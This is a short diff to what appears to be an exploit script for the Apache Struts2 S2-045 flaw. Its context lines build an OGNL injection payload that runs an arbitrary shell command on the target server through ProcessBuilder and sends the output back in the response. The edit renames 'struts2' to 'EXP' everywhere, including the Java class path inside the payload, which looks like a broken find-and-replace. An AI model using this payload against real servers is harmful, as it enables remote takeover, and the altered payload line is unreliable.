@@ -3,7 +3,7 @@ import sys
 import re
 import urllib2
 import httplib
-from struts2.exp_template import Exploit, Level
+from EXP.exp_template import Exploit, Level
 
 from conf import config
 """
@@ -45,7 +45,7 @@ class S2045(Exploit):
         payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
         payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
         payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
-        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+        payload += "(#ros=(@org.apache.EXP.ServletActionContext@getResponse().getOutputStream()))."
         payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
         payload += "(#ros.flush())}"
 
